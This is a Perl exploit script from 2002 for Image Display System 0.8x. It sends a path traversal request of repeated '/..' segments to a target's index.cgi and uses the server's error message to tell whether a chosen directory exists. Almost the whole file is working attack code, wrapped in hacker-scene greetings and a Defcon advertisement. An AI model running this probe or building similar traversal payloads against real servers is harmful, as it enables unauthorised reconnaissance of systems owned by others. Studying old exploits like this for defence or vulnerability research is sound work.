#!/usr/bin/perl -w
#
# ids-inform.pl (05/27/2002)
#
# Image Display System 0.8x Information Disclosure Exploit.
# Checks for existance of specified directory.
#
# By: isox [isox@chainsawbeer.com]
#
#
# usage: self explanitory
#
# my spelling: bad
#
# Hi Cody, You should be proud, I coded for you!
# Hi YpCat, Your perl is k-rad and pheersom.
#
#######
# URL #
#######
# http://0xc0ffee.com
# http://hhp-programming.net
#
#
#################
# Advertisement #
#################
#
# Going to Defcon X this year?  Well come to the one and only Dennys at Defcon breakfast.
# This is quickly becoming a yearly tradition put on by isox.  Check 0xc0ffee.com for
# more information.
#

$maxdepth = 30;

&Banner;

if ($#ARGV < 3) {
  die("Usage $0 <directory> <http://host/path/to/index.cgi> <host> <port>\n");
}

for($t=0; $t<$maxdepth; $t++) {
  $dotdot = "$dotdot" . "/..";
}

$query = "GET $ARGV[1]" . "?mode=album&album=$dotdot/$ARGV[0]\n\n";
$blahblah = &Directory($query, $ARGV[2], $ARGV[3]);

if($blahblah =~ /Sorry, invalid directory name/) {
  print("$ARGV[0] Exists.\n");
} else {
  print("$ARGV[0] Does Not Exist.\n");
}

exit 0;




sub Banner {
  print("IDS Information Disclosure Exploit\n");
  print("Written by isox [isox\@chainsawbeer.com]\n\n");
}


sub Directory {
  use IO::Socket::INET;

  my($query, $host, $port) = @_;

  $sock = new IO::Socket::INET (
            PeerAddr => $host,
            PeerPort => $port,
            Timeout => 8,
            Proto => 'tcp'
          );

  if(!$sock) {
    die("sock: timed out\n");
  }


  print $sock $query;
  read($sock, $buf, 8192);
  close($sock);

  return $buf;
}

<-- EOF -->